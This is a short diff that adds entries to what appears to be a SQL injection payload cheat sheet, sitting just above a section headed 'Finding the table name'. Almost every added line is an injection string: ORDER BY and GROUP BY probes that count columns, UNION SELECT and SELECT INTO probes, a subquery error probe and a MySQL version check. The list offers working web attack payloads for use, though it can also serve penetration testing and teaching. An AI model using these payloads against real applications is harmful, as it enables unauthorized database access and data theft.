@@ -29,6 +29,23 @@
 1' ORDER BY 2--+
 1' ORDER BY 3--+
 
+1' ORDER BY 1,2--+
+1' ORDER BY 1,2,3--+
+
+1' GROUP BY 1,2,--+
+1' GROUP BY 1,2,3--+
+
+-1' UNION SELECT 1,2,3--+
+
+-1 UNION SELECT 1 INTO @,@
+-1 UNION SELECT 1 INTO @,@,@
+
+1 AND (SELECT * FROM Users) = 1	
+
+' AND MID(VERSION(),1,1) = '5';
+
+
+
 Finding the table name
 
 
